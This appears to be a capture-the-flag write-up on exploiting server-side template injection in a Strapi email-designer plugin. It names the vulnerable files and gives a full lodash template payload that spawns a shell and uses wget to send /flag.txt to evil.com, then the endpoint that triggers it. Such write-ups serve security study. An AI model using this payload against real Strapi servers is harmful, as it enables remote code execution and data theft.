+ Looking through the source code, in dependencies, we can see that `strapi-plugin-email-designer": "^2.1.2` is used. This version of email designer is vulnerable to Server side templating injection(SSTI)
+ If you had super administrator access, you can inject a malicious payload into an email template that bypasses the validation function isValidEmailTemplate (file @strapi/plugin-users-permissions/server/controllers/validation/email-template.js ) that exploits a SSTI vulnerability in sendTemplatedEmail (file @strapi/plugin-email/server/services/email.js ). The function sendTemplatedEmail renders email templates into HTML content using the lodash template engine that evaluates JavaScript code within templates
+ Login in with the provided account and create a custom email template using the email designer plugin with the following payload.
<%= `${ process.binding("spawn_sync").spawn({"file":"/bin/sh","args":["/bin/sh","-c","wget https://evil.com?flag=$(cat /flag.txt)"],"stdio":[{"readable":1,"writable":1,"type":"pipe"},{"readable":1,"writable":1,"type":"pipe"/*<>%=*/}]}).output }` %>
Send a request to /api/sendtestemail/{refId} where {refId} is the template reference ID created in step 1.


Reference:
https://www.ghostccamm.com/blog/multi_strapi_vulns/#cve-2023-22621-ssti-to-rce-by-exploiting-email-templates-in-strapi-versions-455
